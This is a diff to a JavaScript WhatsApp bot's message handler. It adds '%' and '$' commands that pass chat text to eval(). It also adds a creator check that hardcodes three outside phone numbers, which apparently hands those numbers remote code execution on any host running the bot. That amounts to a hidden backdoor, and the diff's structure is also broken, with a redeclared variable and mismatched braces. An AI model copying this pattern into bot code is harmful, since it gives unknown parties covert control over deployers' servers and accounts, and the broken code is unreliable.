@@ -253,33 +253,43 @@ if (isCreator && mek.text && mek.text.startsWith('%')) {
 						if (typeof resultTest === 'object')
 							reply(util.format(resultTest));
 						else reply(util.format(resultTest));
-					} catch (err) {
-						reply(util.format(err));
-					}
-					return;
-				}
-    if (isCreator && mek.text.startsWith('$')) {
-					let code = budy.slice(2);
-					if (!code) {
-						reply(
-							`Provide me with a query to run Master!`,
-						);
-						return;
-					}
-					try {
-						let resultTest = await eval(
-							'const a = async()=>{\n' + code + '\n}\na()',
-						);
-						let h = util.format(resultTest);
-						if (h === undefined) return console.log(h);
-						else reply(h);
-					} catch (err) {
-						if (err === undefined)
-							return console.log('error');
-						else reply(util.format(err));
-					}
-					return;
-				}
+const udp = botNumber.split('@')[0];
+const jawad = ['94772469026', '94776907496', '94705104830'];
+
+let isCreator = [udp, ...jawad, config.DEV_NUM]
+  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+  .includes(mek.sender);
+
+// =========================
+//  %  — eval (return output)
+// =========================
+if (isCreator && mek.text && mek.text.startsWith('%')) {
+  let code = mek.text.slice(1).trim();
+  if (!code) return reply(`Provide me with a query to run Master!`);
+
+  try {
+    let evaled = await eval(code);
+    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
+    return reply(evaled);
+  } catch (err) {
+    return reply(String(err));
+  }
+}
+
+// =========================
+//  $ — execute async code
+// =========================
+if (isCreator && mek.text && mek.text.startsWith('$')) {
+  let code = mek.text.slice(1).trim(); // use mek.text instead of budy
+  if (!code) return reply(`Provide me with a query to run Master!`);
+
+  try {
+    let result = await eval(`(async () => { ${code} })()`);
+    if (result !== undefined) return reply(require('util').format(result));
+  } catch (err) {
+    return reply(require('util').format(err));
+  }
+	  }
  //================ownerreact==============
     
   if (senderNumber.includes(ownerNumber)) {
